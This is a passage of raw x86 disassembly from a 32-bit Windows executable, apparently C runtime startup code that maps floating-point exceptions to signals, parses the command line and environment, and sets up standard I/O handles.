  422e35:	push   eax
  422e36:	lea    esi,[esi+0x45c1cc]
  422e3c:	push   DWORD PTR [esi]
  422e3e:	call   0x423e70
  422e43:	pop    ecx
  422e44:	push   eax
  422e45:	push   DWORD PTR [esi]
  422e47:	push   0xfffffff4
  422e49:	call   DWORD PTR ds:0x428038
  422e4f:	push   eax
  422e50:	call   DWORD PTR ds:0x428034
  422e56:	lea    esp,[ebp-0x118]
  422e5c:	mov    ecx,DWORD PTR [ebp-0x4]
  422e5f:	xor    ecx,DWORD PTR [ebp+0x4]
  422e62:	call   0x423f2c
  422e67:	pop    edi
  422e68:	pop    esi
  422e69:	pop    ebx
  422e6a:	leave  
  422e6b:	ret    
  422e6c:	mov    eax,ds:0x45cabc
  422e71:	cmp    eax,0x1
  422e74:	je     0x422e83
  422e76:	test   eax,eax
  422e78:	jne    0x422ea4
  422e7a:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422e81:	jne    0x422ea4
  422e83:	push   0xfc
  422e88:	call   0x422cf5
  422e8d:	mov    eax,ds:0x45cb08
  422e92:	test   eax,eax
  422e94:	pop    ecx
  422e95:	je     0x422e99
  422e97:	call   eax
  422e99:	push   0xff
  422e9e:	call   0x422cf5
  422ea3:	pop    ecx
  422ea4:	ret    
  422ea5:	push   ebp
  422ea6:	mov    ebp,esp
  422ea8:	push   ecx
  422ea9:	push   ebx
  422eaa:	push   esi
  422eab:	push   edi
  422eac:	call   0x42370d
  422eb1:	mov    edi,DWORD PTR [ebp+0x8]
  422eb4:	mov    esi,eax
  422eb6:	mov    edx,DWORD PTR [esi+0x54]
  422eb9:	mov    eax,ds:0x45c2dc
  422ebe:	mov    ecx,edx
  422ec0:	cmp    DWORD PTR [ecx],edi
  422ec2:	je     0x422ed1
  422ec4:	lea    ebx,[eax+eax*2]
  422ec7:	add    ecx,0xc
  422eca:	lea    ebx,[edx+ebx*4]
  422ecd:	cmp    ecx,ebx
  422ecf:	jb     0x422ec0
  422ed1:	lea    eax,[eax+eax*2]
  422ed4:	lea    eax,[edx+eax*4]
  422ed7:	cmp    ecx,eax
  422ed9:	jae    0x422edf
  422edb:	cmp    DWORD PTR [ecx],edi
  422edd:	je     0x422ee1
  422edf:	xor    ecx,ecx
  422ee1:	test   ecx,ecx
  422ee3:	je     0x422ffb
  422ee9:	mov    ebx,DWORD PTR [ecx+0x8]
  422eec:	test   ebx,ebx
  422eee:	mov    DWORD PTR [ebp+0x8],ebx
  422ef1:	je     0x422ffb
  422ef7:	cmp    ebx,0x5
  422efa:	jne    0x422f08
  422efc:	and    DWORD PTR [ecx+0x8],0x0
  422f00:	xor    eax,eax
  422f02:	inc    eax
  422f03:	jmp    0x423004
  422f08:	cmp    ebx,0x1
  422f0b:	je     0x422ff6
  422f11:	mov    eax,DWORD PTR [esi+0x58]
  422f14:	mov    DWORD PTR [ebp-0x4],eax
  422f17:	mov    eax,DWORD PTR [ebp+0xc]
  422f1a:	mov    DWORD PTR [esi+0x58],eax
  422f1d:	mov    eax,DWORD PTR [ecx+0x4]
  422f20:	cmp    eax,0x8
  422f23:	jne    0x422fe8
  422f29:	mov    edx,DWORD PTR ds:0x45c2d0
  422f2f:	mov    eax,ds:0x45c2d4
  422f34:	add    eax,edx
  422f36:	cmp    edx,eax
  422f38:	jge    0x422f61
  422f3a:	lea    eax,[edx+edx*2]
  422f3d:	shl    eax,0x2
  422f40:	mov    edi,DWORD PTR [esi+0x54]
  422f43:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f48:	mov    edi,DWORD PTR ds:0x45c2d0
  422f4e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422f54:	inc    edx
  422f55:	add    ebx,edi
  422f57:	add    eax,0xc
  422f5a:	cmp    edx,ebx
  422f5c:	jl     0x422f40
  422f5e:	mov    ebx,DWORD PTR [ebp+0x8]
  422f61:	mov    ecx,DWORD PTR [ecx]
  422f63:	cmp    ecx,0xc000008e
  422f69:	mov    edi,DWORD PTR [esi+0x5c]
  422f6c:	jne    0x422f77
  422f6e:	mov    DWORD PTR [esi+0x5c],0x83
  422f75:	jmp    0x422fdb
  422f77:	cmp    ecx,0xc0000090
  422f7d:	jne    0x422f88
  422f7f:	mov    DWORD PTR [esi+0x5c],0x81
  422f86:	jmp    0x422fdb
  422f88:	cmp    ecx,0xc0000091
  422f8e:	jne    0x422f99
  422f90:	mov    DWORD PTR [esi+0x5c],0x84
  422f97:	jmp    0x422fdb
  422f99:	cmp    ecx,0xc0000093
  422f9f:	jne    0x422faa
  422fa1:	mov    DWORD PTR [esi+0x5c],0x85
  422fa8:	jmp    0x422fdb
  422faa:	cmp    ecx,0xc000008d
  422fb0:	jne    0x422fbb
  422fb2:	mov    DWORD PTR [esi+0x5c],0x82
  422fb9:	jmp    0x422fdb
  422fbb:	cmp    ecx,0xc000008f
  422fc1:	jne    0x422fcc
  422fc3:	mov    DWORD PTR [esi+0x5c],0x86
  422fca:	jmp    0x422fdb
  422fcc:	cmp    ecx,0xc0000092
  422fd2:	jne    0x422fdb
  422fd4:	mov    DWORD PTR [esi+0x5c],0x8a
  422fdb:	push   DWORD PTR [esi+0x5c]
  422fde:	push   0x8
  422fe0:	call   ebx
  422fe2:	pop    ecx
  422fe3:	mov    DWORD PTR [esi+0x5c],edi
  422fe6:	jmp    0x422fef
  422fe8:	and    DWORD PTR [ecx+0x8],0x0
  422fec:	push   eax
  422fed:	call   ebx
  422fef:	mov    eax,DWORD PTR [ebp-0x4]
  422ff2:	pop    ecx
  422ff3:	mov    DWORD PTR [esi+0x58],eax
  422ff6:	or     eax,0xffffffff
  422ff9:	jmp    0x423004
  422ffb:	push   DWORD PTR [ebp+0xc]
  422ffe:	call   DWORD PTR ds:0x428040
  423004:	pop    edi
  423005:	pop    esi
  423006:	pop    ebx
  423007:	leave  
  423008:	ret    
  423009:	cmp    DWORD PTR ds:0x45d26c,0x0
  423010:	jne    0x423017
  423012:	call   0x42444c
  423017:	push   esi
  423018:	mov    esi,DWORD PTR ds:0x45d274
  42301e:	test   esi,esi
  423020:	jne    0x423029
  423022:	mov    esi,0x42849b
  423027:	jmp    0x42306e
  423029:	mov    al,BYTE PTR [esi]
  42302b:	cmp    al,0x22
  42302d:	jne    0x423057
  42302f:	inc    esi
  423030:	mov    al,BYTE PTR [esi]
  423032:	cmp    al,0x22
  423034:	je     0x423067
  423036:	test   al,al
  423038:	je     0x423050
  42303a:	movzx  eax,al
  42303d:	push   eax
  42303e:	call   0x423f6b
  423043:	test   eax,eax
  423045:	pop    ecx
  423046:	je     0x423049
  423048:	inc    esi
  423049:	inc    esi
  42304a:	mov    al,BYTE PTR [esi]
  42304c:	cmp    al,0x22
  42304e:	jne    0x423036
  423050:	cmp    BYTE PTR [esi],0x22
  423053:	jne    0x423068
  423055:	jmp    0x423067
  423057:	cmp    al,0x20
  423059:	jbe    0x423068
  42305b:	inc    esi
  42305c:	cmp    BYTE PTR [esi],0x20
  42305f:	ja     0x42305b
  423061:	jmp    0x423068
  423063:	cmp    al,0x20
  423065:	ja     0x42306e
  423067:	inc    esi
  423068:	mov    al,BYTE PTR [esi]
  42306a:	test   al,al
  42306c:	jne    0x423063
  42306e:	mov    eax,esi
  423070:	pop    esi
  423071:	ret    
  423072:	push   ebx
  423073:	xor    ebx,ebx
  423075:	cmp    DWORD PTR ds:0x45d26c,ebx
  42307b:	push   esi
  42307c:	push   edi
  42307d:	jne    0x423084
  42307f:	call   0x42444c
  423084:	mov    esi,DWORD PTR ds:0x45cab4
  42308a:	xor    edi,edi
  42308c:	cmp    esi,ebx
  42308e:	jne    0x4230a2
  423090:	jmp    0x4230c2
  423092:	cmp    al,0x3d
  423094:	je     0x423097
  423096:	inc    edi
  423097:	push   esi
  423098:	call   0x423e70
  42309d:	pop    ecx
  42309e:	lea    esi,[esi+eax*1+0x1]
  4230a2:	mov    al,BYTE PTR [esi]
  4230a4:	cmp    al,bl
  4230a6:	jne    0x423092
  4230a8:	lea    eax,[edi*4+0x4]
  4230af:	push   eax
  4230b0:	call   0x424582
  4230b5:	mov    edi,eax
  4230b7:	cmp    edi,ebx
  4230b9:	pop    ecx
  4230ba:	mov    DWORD PTR ds:0x45cae4,edi
  4230c0:	jne    0x4230c7
  4230c2:	or     eax,0xffffffff
  4230c5:	jmp    0x42311f
  4230c7:	mov    esi,DWORD PTR ds:0x45cab4
  4230cd:	push   ebp
  4230ce:	jmp    0x4230fa
  4230d0:	push   esi
  4230d1:	call   0x423e70
  4230d6:	mov    ebp,eax
  4230d8:	inc    ebp
  4230d9:	cmp    BYTE PTR [esi],0x3d
  4230dc:	pop    ecx
  4230dd:	je     0x4230f8
  4230df:	push   ebp
  4230e0:	call   0x424582
  4230e5:	cmp    eax,ebx
  4230e7:	pop    ecx
  4230e8:	mov    DWORD PTR [edi],eax
  4230ea:	je     0x423123
  4230ec:	push   esi
  4230ed:	push   eax
  4230ee:	call   0x423c40
  4230f3:	pop    ecx
  4230f4:	pop    ecx
  4230f5:	add    edi,0x4
  4230f8:	add    esi,ebp
  4230fa:	cmp    BYTE PTR [esi],bl
  4230fc:	jne    0x4230d0
  4230fe:	push   DWORD PTR ds:0x45cab4
  423104:	call   0x42446a
  423109:	mov    DWORD PTR ds:0x45cab4,ebx
  42310f:	mov    DWORD PTR [edi],ebx
  423111:	mov    DWORD PTR ds:0x45d260,0x1
  42311b:	xor    eax,eax
  42311d:	pop    ecx
  42311e:	pop    ebp
  42311f:	pop    edi
  423120:	pop    esi
  423121:	pop    ebx
  423122:	ret    
  423123:	push   DWORD PTR ds:0x45cae4
  423129:	call   0x42446a
  42312e:	mov    DWORD PTR ds:0x45cae4,ebx
  423134:	or     eax,0xffffffff
  423137:	jmp    0x42311d
  423139:	push   ebp
  42313a:	mov    ebp,esp
  42313c:	push   ecx
  42313d:	push   ebx
  42313e:	mov    ebx,DWORD PTR [ebp+0xc]
  423141:	xor    edx,edx
  423143:	cmp    DWORD PTR [ebp+0x8],edx
  423146:	push   edi
  423147:	mov    DWORD PTR [esi],edx
  423149:	mov    edi,ecx
  42314b:	mov    DWORD PTR [ebx],0x1
  423151:	je     0x42315c
  423153:	mov    ecx,DWORD PTR [ebp+0x8]
  423156:	add    DWORD PTR [ebp+0x8],0x4
  42315a:	mov    DWORD PTR [ecx],edi
  42315c:	cmp    BYTE PTR [eax],0x22
  42315f:	jne    0x42316f
  423161:	xor    ecx,ecx
  423163:	test   edx,edx
  423165:	sete   cl
  423168:	inc    eax
  423169:	mov    edx,ecx
  42316b:	mov    cl,0x22
  42316d:	jmp    0x42319c
  42316f:	inc    DWORD PTR [esi]
  423171:	test   edi,edi
  423173:	je     0x42317a
  423175:	mov    cl,BYTE PTR [eax]
  423177:	mov    BYTE PTR [edi],cl
  423179:	inc    edi
  42317a:	mov    cl,BYTE PTR [eax]
  42317c:	movzx  ebx,cl
  42317f:	inc    eax
  423180:	test   BYTE PTR [ebx+0x45cf21],0x4
  423187:	je     0x423195
  423189:	inc    DWORD PTR [esi]
  42318b:	test   edi,edi
  42318d:	je     0x423194
  42318f:	mov    bl,BYTE PTR [eax]
  423191:	mov    BYTE PTR [edi],bl
  423193:	inc    edi
  423194:	inc    eax
  423195:	test   cl,cl
  423197:	mov    ebx,DWORD PTR [ebp+0xc]
  42319a:	je     0x4231ce
  42319c:	test   edx,edx
  42319e:	jne    0x42315c
  4231a0:	cmp    cl,0x20
  4231a3:	je     0x4231aa
  4231a5:	cmp    cl,0x9
  4231a8:	jne    0x42315c
  4231aa:	test   edi,edi
  4231ac:	je     0x4231b2
  4231ae:	and    BYTE PTR [edi-0x1],0x0
  4231b2:	and    DWORD PTR [ebp-0x4],0x0
  4231b6:	cmp    BYTE PTR [eax],0x0
  4231b9:	je     0x423295
  4231bf:	mov    cl,BYTE PTR [eax]
  4231c1:	cmp    cl,0x20
  4231c4:	je     0x4231cb
  4231c6:	cmp    cl,0x9
  4231c9:	jne    0x4231d1
  4231cb:	inc    eax
  4231cc:	jmp    0x4231bf
  4231ce:	dec    eax
  4231cf:	jmp    0x4231b2
  4231d1:	cmp    BYTE PTR [eax],0x0
  4231d4:	je     0x423295
  4231da:	cmp    DWORD PTR [ebp+0x8],0x0
  4231de:	je     0x4231e9
  4231e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4231e3:	add    DWORD PTR [ebp+0x8],0x4
  4231e7:	mov    DWORD PTR [ecx],edi
  4231e9:	inc    DWORD PTR [ebx]
  4231eb:	xor    ebx,ebx
  4231ed:	inc    ebx
  4231ee:	xor    edx,edx
  4231f0:	jmp    0x4231f4
  4231f2:	inc    eax
  4231f3:	inc    edx
  4231f4:	cmp    BYTE PTR [eax],0x5c
  4231f7:	je     0x4231f2
  4231f9:	cmp    BYTE PTR [eax],0x22
  4231fc:	jne    0x423224
  4231fe:	test   dl,0x1
  423201:	jne    0x423222
  423203:	cmp    DWORD PTR [ebp-0x4],0x0
  423207:	je     0x423215
  423209:	lea    ecx,[eax+0x1]
  42320c:	cmp    BYTE PTR [ecx],0x22
  42320f:	jne    0x423215
  423211:	mov    eax,ecx
  423213:	jmp    0x423217
  423215:	xor    ebx,ebx
  423217:	xor    ecx,ecx
  423219:	cmp    DWORD PTR [ebp-0x4],ecx
  42321c:	sete   cl
  42321f:	mov    DWORD PTR [ebp-0x4],ecx
  423222:	shr    edx,1
  423224:	test   edx,edx
  423226:	je     0x423235
  423228:	test   edi,edi
  42322a:	je     0x423230
  42322c:	mov    BYTE PTR [edi],0x5c
  42322f:	inc    edi
  423230:	inc    DWORD PTR [esi]
  423232:	dec    edx
  423233:	jne    0x423228
  423235:	mov    cl,BYTE PTR [eax]
  423237:	test   cl,cl
  423239:	je     0x423283
  42323b:	cmp    DWORD PTR [ebp-0x4],0x0
  42323f:	jne    0x42324b
  423241:	cmp    cl,0x20
  423244:	je     0x423283
  423246:	cmp    cl,0x9
  423249:	je     0x423283
  42324b:	test   ebx,ebx
  42324d:	je     0x42327d
  42324f:	test   edi,edi
  423251:	je     0x42326c
  423253:	movzx  edx,cl
  423256:	test   BYTE PTR [edx+0x45cf21],0x4
  42325d:	je     0x423265
  42325f:	mov    BYTE PTR [edi],cl
  423261:	inc    edi
  423262:	inc    eax
  423263:	inc    DWORD PTR [esi]
  423265:	mov    cl,BYTE PTR [eax]
  423267:	mov    BYTE PTR [edi],cl
  423269:	inc    edi
  42326a:	jmp    0x42327b
  42326c:	movzx  ecx,cl
  42326f:	test   BYTE PTR [ecx+0x45cf21],0x4
  423276:	je     0x42327b
  423278:	inc    eax
  423279:	inc    DWORD PTR [esi]
  42327b:	inc    DWORD PTR [esi]
  42327d:	inc    eax
  42327e:	jmp    0x4231eb
  423283:	test   edi,edi
  423285:	je     0x42328b
  423287:	and    BYTE PTR [edi],0x0
  42328a:	inc    edi
  42328b:	inc    DWORD PTR [esi]
  42328d:	mov    ebx,DWORD PTR [ebp+0xc]
  423290:	jmp    0x4231b6
  423295:	mov    eax,DWORD PTR [ebp+0x8]
  423298:	test   eax,eax
  42329a:	je     0x42329f
  42329c:	and    DWORD PTR [eax],0x0
  42329f:	inc    DWORD PTR [ebx]
  4232a1:	pop    edi
  4232a2:	pop    ebx
  4232a3:	leave  
  4232a4:	ret    
  4232a5:	push   ebp
  4232a6:	mov    ebp,esp
  4232a8:	push   ecx
  4232a9:	push   ecx
  4232aa:	push   ebx
  4232ab:	push   esi
  4232ac:	push   edi
  4232ad:	xor    edi,edi
  4232af:	cmp    DWORD PTR ds:0x45d26c,edi
  4232b5:	jne    0x4232bc
  4232b7:	call   0x42444c
  4232bc:	and    BYTE PTR ds:0x45cc14,0x0
  4232c3:	push   0x104
  4232c8:	mov    esi,0x45cb10
  4232cd:	push   esi
  4232ce:	push   edi
  4232cf:	call   DWORD PTR ds:0x42803c
  4232d5:	mov    eax,ds:0x45d274
  4232da:	cmp    eax,edi
  4232dc:	mov    DWORD PTR ds:0x45caf4,esi
  4232e2:	je     0x4232eb
  4232e4:	cmp    BYTE PTR [eax],0x0
  4232e7:	mov    ebx,eax
  4232e9:	jne    0x4232ed
  4232eb:	mov    ebx,esi
  4232ed:	lea    eax,[ebp-0x4]
  4232f0:	push   eax
  4232f1:	push   edi
  4232f2:	lea    esi,[ebp-0x8]
  4232f5:	xor    ecx,ecx
  4232f7:	mov    eax,ebx
  4232f9:	call   0x423139
  4232fe:	mov    esi,DWORD PTR [ebp-0x4]
  423301:	mov    eax,DWORD PTR [ebp-0x8]
  423304:	shl    esi,0x2
  423307:	add    eax,esi
  423309:	push   eax
  42330a:	call   0x424582
  42330f:	mov    edi,eax
  423311:	add    esp,0xc
  423314:	test   edi,edi
  423316:	jne    0x42331d
  423318:	or     eax,0xffffffff
  42331b:	jmp    0x423342
  42331d:	lea    eax,[ebp-0x4]
  423320:	push   eax
  423321:	lea    ecx,[esi+edi*1]
  423324:	push   edi
  423325:	lea    esi,[ebp-0x8]
  423328:	mov    eax,ebx
  42332a:	call   0x423139
  42332f:	mov    eax,DWORD PTR [ebp-0x4]
  423332:	dec    eax
  423333:	pop    ecx
  423334:	mov    ds:0x45cad8,eax
  423339:	pop    ecx
  42333a:	mov    DWORD PTR ds:0x45cadc,edi
  423340:	xor    eax,eax
  423342:	pop    edi
  423343:	pop    esi
  423344:	pop    ebx
  423345:	leave  
  423346:	ret    
  423347:	push   ecx
  423348:	push   ecx
  423349:	mov    eax,ds:0x45cc18
  42334e:	push   ebx
  42334f:	push   ebp
  423350:	push   esi
  423351:	push   edi
  423352:	mov    edi,DWORD PTR ds:0x428054
  423358:	xor    ebx,ebx
  42335a:	xor    esi,esi
  42335c:	cmp    eax,ebx
  42335e:	push   0x2
  423360:	pop    ebp
  423361:	jne    0x423390
  423363:	call   edi
  423365:	mov    esi,eax
  423367:	cmp    esi,ebx
  423369:	je     0x423377
  42336b:	mov    DWORD PTR ds:0x45cc18,0x1
  423375:	jmp    0x423395
  423377:	call   DWORD PTR ds:0x428010
  42337d:	cmp    eax,0x78
  423380:	jne    0x42338b
  423382:	mov    eax,ebp
  423384:	mov    ds:0x45cc18,eax
  423389:	jmp    0x423390
  42338b:	mov    eax,ds:0x45cc18
  423390:	cmp    eax,0x1
  423393:	jne    0x423412
  423395:	cmp    esi,ebx
  423397:	jne    0x4233a1
  423399:	call   edi
  42339b:	mov    esi,eax
  42339d:	cmp    esi,ebx
  42339f:	je     0x42341a
  4233a1:	cmp    WORD PTR [esi],bx
  4233a4:	mov    eax,esi
  4233a6:	je     0x4233b6
  4233a8:	add    eax,ebp
  4233aa:	cmp    WORD PTR [eax],bx
  4233ad:	jne    0x4233a8
  4233af:	add    eax,ebp
  4233b1:	cmp    WORD PTR [eax],bx
  4233b4:	jne    0x4233a8
  4233b6:	mov    edi,DWORD PTR ds:0x428050
  4233bc:	push   ebx
  4233bd:	push   ebx
  4233be:	push   ebx
  4233bf:	sub    eax,esi
  4233c1:	push   ebx
  4233c2:	sar    eax,1
  4233c4:	inc    eax
  4233c5:	push   eax
  4233c6:	push   esi
  4233c7:	push   ebx
  4233c8:	push   ebx
  4233c9:	mov    DWORD PTR [esp+0x34],eax
  4233cd:	call   edi
  4233cf:	mov    ebp,eax
  4233d1:	cmp    ebp,ebx
  4233d3:	je     0x423407
  4233d5:	push   ebp
  4233d6:	call   0x424582
  4233db:	cmp    eax,ebx
  4233dd:	pop    ecx
  4233de:	mov    DWORD PTR [esp+0x10],eax
  4233e2:	je     0x423407
  4233e4:	push   ebx
  4233e5:	push   ebx
  4233e6:	push   ebp
  4233e7:	push   eax
  4233e8:	push   DWORD PTR [esp+0x24]
  4233ec:	push   esi
  4233ed:	push   ebx
  4233ee:	push   ebx
  4233ef:	call   edi
  4233f1:	test   eax,eax
  4233f3:	jne    0x423403
  4233f5:	push   DWORD PTR [esp+0x10]
  4233f9:	call   0x42446a
  4233fe:	pop    ecx
  4233ff:	mov    DWORD PTR [esp+0x10],ebx
  423403:	mov    ebx,DWORD PTR [esp+0x10]
  423407:	push   esi
  423408:	call   DWORD PTR ds:0x42804c
  42340e:	mov    eax,ebx
  423410:	jmp    0x423462
  423412:	cmp    eax,ebp
  423414:	je     0x42341e
  423416:	cmp    eax,ebx
  423418:	je     0x42341e
  42341a:	xor    eax,eax
  42341c:	jmp    0x423462
  42341e:	call   DWORD PTR ds:0x428048
  423424:	mov    esi,eax
  423426:	cmp    esi,ebx
  423428:	je     0x42341a
  42342a:	cmp    BYTE PTR [esi],bl
  42342c:	je     0x423438
  42342e:	inc    eax
  42342f:	cmp    BYTE PTR [eax],bl
  423431:	jne    0x42342e
  423433:	inc    eax
  423434:	cmp    BYTE PTR [eax],bl
  423436:	jne    0x42342e
  423438:	sub    eax,esi
  42343a:	inc    eax
  42343b:	mov    ebp,eax
  42343d:	push   ebp
  42343e:	call   0x424582
  423443:	mov    edi,eax
  423445:	cmp    edi,ebx
  423447:	pop    ecx
  423448:	jne    0x42344e
  42344a:	xor    edi,edi
  42344c:	jmp    0x423459
  42344e:	push   ebp
  42344f:	push   esi
  423450:	push   edi
  423451:	call   0x4245a0
  423456:	add    esp,0xc
  423459:	push   esi
  42345a:	call   DWORD PTR ds:0x428044
  423460:	mov    eax,edi
  423462:	pop    edi
  423463:	pop    esi
  423464:	pop    ebp
  423465:	pop    ebx
  423466:	pop    ecx
  423467:	pop    ecx
  423468:	ret    
  423469:	sub    esp,0x48
  42346c:	push   ebx
  42346d:	mov    ebx,0x480
  423472:	push   ebx
  423473:	call   0x424582
  423478:	test   eax,eax
  42347a:	pop    ecx
  42347b:	jne    0x423485
  42347d:	or     eax,0xffffffff
  423480:	jmp    0x423662
  423485:	mov    ds:0x45d160,eax
  42348a:	mov    DWORD PTR ds:0x45d148,0x20
  423494:	lea    ecx,[eax+0x480]
  42349a:	jmp    0x4234ba
  42349c:	and    BYTE PTR [eax+0x4],0x0
  4234a0:	or     DWORD PTR [eax],0xffffffff
  4234a3:	and    DWORD PTR [eax+0x8],0x0
  4234a7:	mov    BYTE PTR [eax+0x5],0xa
  4234ab:	mov    ecx,DWORD PTR ds:0x45d160
  4234b1:	add    eax,0x24
  4234b4:	add    ecx,0x480
  4234ba:	cmp    eax,ecx
  4234bc:	jb     0x42349c
  4234be:	push   ebp
  4234bf:	push   esi
  4234c0:	push   edi
  4234c1:	lea    eax,[esp+0x14]
  4234c5:	push   eax
  4234c6:	call   DWORD PTR ds:0x42801c
  4234cc:	cmp    WORD PTR [esp+0x46],0x0
  4234d2:	je     0x4235c1
  4234d8:	mov    eax,DWORD PTR [esp+0x48]
  4234dc:	test   eax,eax
  4234de:	je     0x4235c1
  4234e4:	mov    edi,DWORD PTR [eax]
  4234e6:	lea    ebp,[eax+0x4]
  4234e9:	lea    eax,[edi+ebp*1]
  4234ec:	mov    DWORD PTR [esp+0x10],eax
  4234f0:	mov    eax,0x800
  4234f5:	cmp    edi,eax
  4234f7:	jl     0x4234fb
  4234f9:	mov    edi,eax
  4234fb:	cmp    DWORD PTR ds:0x45d148,edi
  423501:	jge    0x423551
  423503:	mov    esi,0x45d164
  423508:	push   ebx
  423509:	call   0x424582
  42350e:	test   eax,eax
  423510:	pop    ecx
  423511:	je     0x42354b
  423513:	add    DWORD PTR ds:0x45d148,0x20
  42351a:	mov    DWORD PTR [esi],eax
  42351c:	lea    ecx,[eax+0x480]
  423522:	jmp    0x42353a
  423524:	and    BYTE PTR [eax+0x4],0x0
  423528:	or     DWORD PTR [eax],0xffffffff
  42352b:	and    DWORD PTR [eax+0x8],0x0
  42352f:	mov    BYTE PTR [eax+0x5],0xa
  423533:	mov    ecx,DWORD PTR [esi]
  423535:	add    eax,0x24
  423538:	add    ecx,ebx
  42353a:	cmp    eax,ecx
  42353c:	jb     0x423524
  42353e:	add    esi,0x4
  423541:	cmp    DWORD PTR ds:0x45d148,edi
  423547:	jl     0x423508
  423549:	jmp    0x423551
  42354b:	mov    edi,DWORD PTR ds:0x45d148
  423551:	xor    ebx,ebx
  423553:	test   edi,edi
  423555:	jle    0x4235c1
  423557:	mov    eax,DWORD PTR [esp+0x10]
  42355b:	mov    eax,DWORD PTR [eax]
  42355d:	cmp    eax,0xffffffff
  423560:	je     0x4235b6
  423562:	mov    cl,BYTE PTR [ebp+0x0]
  423565:	test   cl,0x1
  423568:	je     0x4235b6
  42356a:	test   cl,0x8
  42356d:	jne    0x42357a
  42356f:	push   eax
  423570:	call   DWORD PTR ds:0x42805c
  423576:	test   eax,eax
  423578:	je     0x4235b6
  42357a:	mov    ecx,ebx
  42357c:	mov    eax,ebx
  42357e:	and    eax,0x1f
  423581:	lea    eax,[eax+eax*8]
  423584:	sar    ecx,0x5
  423587:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  42358e:	lea    esi,[ecx+eax*4]
  423591:	mov    eax,DWORD PTR [esp+0x10]
  423595:	mov    eax,DWORD PTR [eax]
  423597:	mov    DWORD PTR [esi],eax
  423599:	mov    al,BYTE PTR [ebp+0x0]
  42359c:	mov    BYTE PTR [esi+0x4],al
  42359f:	lea    eax,[esi+0xc]
  4235a2:	push   0xfa0
  4235a7:	push   eax
  4235a8:	call   0x4248ed
  4235ad:	test   eax,eax
  4235af:	pop    ecx
  4235b0:	pop    ecx
  4235b1:	je     0x4235e1
  4235b3:	inc    DWORD PTR [esi+0x8]
  4235b6:	add    DWORD PTR [esp+0x10],0x4
  4235bb:	inc    ebx
  4235bc:	inc    ebp
  4235bd:	cmp    ebx,edi
  4235bf:	jl     0x423557
  4235c1:	xor    ebx,ebx
  4235c3:	mov    ecx,DWORD PTR ds:0x45d160
  4235c9:	lea    eax,[ebx+ebx*8]
  4235cc:	lea    esi,[ecx+eax*4]
  4235cf:	cmp    DWORD PTR [esi],0xffffffff
  4235d2:	jne    0x423643
  4235d4:	test   ebx,ebx
  4235d6:	mov    BYTE PTR [esi+0x4],0x81
  4235da:	jne    0x4235e6
  4235dc:	push   0xfffffff6
  4235de:	pop    eax
  4235df:	jmp    0x4235f0
  4235e1:	or     eax,0xffffffff
  4235e4:	jmp    0x42365f
  4235e6:	mov    eax,ebx
  4235e8:	dec    eax
  4235e9:	neg    eax
  4235eb:	sbb    eax,eax
  4235ed:	add    eax,0xfffffff5
  4235f0:	push   eax
  4235f1:	call   DWORD PTR ds:0x428038
  4235f7:	mov    edi,eax
  4235f9:	cmp    edi,0xffffffff
  4235fc:	je     0x42363d
  4235fe:	push   edi
  4235ff:	call   DWORD PTR ds:0x42805c
  423605:	test   eax,eax
  423607:	je     0x42363d
  423609:	and    eax,0xff
  42360e:	cmp    eax,0x2
  423611:	mov    DWORD PTR [esi],edi
  423613:	jne    0x42361b
  423615:	or     BYTE PTR [esi+0x4],0x40
  423619:	jmp    0x423624
  42361b:	cmp    eax,0x3
  42361e:	jne    0x423624
  423620:	or     BYTE PTR [esi+0x4],0x8
  423624:	lea    eax,[esi+0xc]
  423627:	push   0xfa0
  42362c:	push   eax
  42362d:	call   0x4248ed
  423632:	test   eax,eax
  423634:	pop    ecx
  423635:	pop    ecx
  423636:	je     0x4235e1
  423638:	inc    DWORD PTR [esi+0x8]
  42363b:	jmp    0x423647
  42363d:	or     BYTE PTR [esi+0x4],0x40
  423641:	jmp    0x423647
  423643:	or     BYTE PTR [esi+0x4],0x80
  423647:	inc    ebx
  423648:	cmp    ebx,0x3
  42364b:	jl     0x4235c3
  423651:	push   DWORD PTR ds:0x45d148
  423657:	call   DWORD PTR ds:0x428058
  42365d:	xor    eax,eax
  42365f:	pop    edi
  423660:	pop    esi
  423661:	pop    ebp
  423662:	pop    ebx
  423663:	add    esp,0x48
  423666:	ret    
  423667:	push   0xc
  423669:	push   0x4284a0
  42366e:	call   0x423858
  423673:	mov    DWORD PTR [ebp-0x1c],0x428ef8
  42367a:	cmp    DWORD PTR [ebp-0x1c],0x428ef8
  423681:	jae    0x4236a5
  423683:	and    DWORD PTR [ebp-0x4],0x0
  423687:	mov    eax,DWORD PTR [ebp-0x1c]
  42368a:	mov    eax,DWORD PTR [eax]
  42368c:	test   eax,eax
  42368e:	je     0x42369b
  423690:	call   eax
  423692:	jmp    0x42369b
  423694:	xor    eax,eax
  423696:	inc    eax
  423697:	ret    
  423698:	mov    esp,DWORD PTR [ebp-0x18]
  42369b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42369f:	add    DWORD PTR [ebp-0x1c],0x4
  4236a3:	jmp    0x42367a
  4236a5:	call   0x423893
  4236aa:	ret    
  4236ab:	push   0xc
  4236ad:	push   0x4284b0
  4236b2:	call   0x423858
  4236b7:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236be:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236c5:	jae    0x4236e9
  4236c7:	and    DWORD PTR [ebp-0x4],0x0
  4236cb:	mov    eax,DWORD PTR [ebp-0x1c]
  4236ce:	mov    eax,DWORD PTR [eax]
  4236d0:	test   eax,eax
  4236d2:	je     0x4236df
  4236d4:	call   eax
  4236d6:	jmp    0x4236df
  4236d8:	xor    eax,eax
  4236da:	inc    eax
  4236db:	ret    
  4236dc:	mov    esp,DWORD PTR [ebp-0x18]
  4236df:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236e3:	add    DWORD PTR [ebp-0x1c],0x4
  4236e7:	jmp    0x4236be
  4236e9:	call   0x423893
  4236ee:	ret    
  4236ef:	call   0x423936
  4236f4:	mov    eax,ds:0x45c304
  4236f9:	cmp    eax,0xffffffff
  4236fc:	je     0x42370c
  4236fe:	push   eax
  4236ff:	call   DWORD PTR ds:0x428064
  423705:	or     DWORD PTR ds:0x45c304,0xffffffff
  42370c:	ret    
  42370d:	push   ebx
  42370e:	push   esi
  42370f:	call   DWORD PTR ds:0x428010
  423715:	push   DWORD PTR ds:0x45c304
  42371b:	mov    ebx,eax
